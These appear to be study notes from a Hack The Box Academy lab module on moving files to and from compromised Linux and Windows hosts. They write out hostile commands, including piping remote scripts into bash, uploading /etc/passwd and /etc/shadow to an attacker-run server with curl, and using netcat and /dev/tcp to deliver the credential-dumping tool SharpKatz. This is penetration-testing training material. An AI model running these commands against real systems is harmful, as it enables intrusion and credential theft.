## Using SCP

```rb
shakir0x00@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

## Using Base64



```rb
shakir0x00@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

```rb
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```


## Fileless Attacks Using Linux

##### CURL 
```shell-session
shakir0x00@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

WGET

```shell-session
shakir0x00@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```



## Download with Bash (/dev/tcp)

#### Connect to the Target Webserver

```shell
shakir0x00@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET Request

```shell
shakir0x00@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### Print the Response

```shell
shakir0x00@htb[/htb]$ cat <&3
```


#### Linux - Downloading Files Using SCP

```shell-session
shakir0x00@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

# Upload Operations

#### Pwnbox - Start Web Server

```shell-session
shakir0x00@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we need to create a certificate. In this example, we are using a self-signed certificate.

#### Pwnbox - Create a Self-Signed Certificate

```shell-session
shakir0x00@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.

#### Pwnbox - Start Web Server

```shell-session
shakir0x00@htb[/htb]$ mkdir https && cd https
```

```shell-session
shakir0x00@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.

#### Linux - Upload Multiple Files

```shell-session
shakir0x00@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.

# Alternatives.
#### Linux - Creating a Web Server with PHP

```shell-session
shakir0x00@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - Creating a Web Server with Ruby

```shell-session
shakir0x00@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```
## SCP Upload


#### File Upload using SCP

```rb
shakir0x00@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```



# WINDOWS

#### NetCat - Compromised Machine - Listening on Port 8000

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
shakir0x00@htb[/htb]$ # Example using Original Netcat
shakir0x00@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
shakir0x00@htb[/htb]$ # Example using Ncat
shakir0x00@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ # Example using Original Netcat
shakir0x00@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ # Example using Ncat
shakir0x00@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ # Example using Original Netcat
shakir0x00@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Ncat

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ # Example using Ncat
shakir0x00@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

Miscellaneous File Transfer Methods

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Note:** The same operation can be used to transfer files from the compromised host to our Pwnbox.


## PowerShell Session File Transfer

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

Miscellaneous File Transfer Methods

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

Miscellaneous File Transfer Methods

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

Miscellaneous File Transfer Methods

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

Miscellaneous File Transfer Methods

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


### RDP
#### Mounting a Linux Folder Using rdesktop

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

Miscellaneous File Transfer Methods

```shell-session
shakir0x00@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```


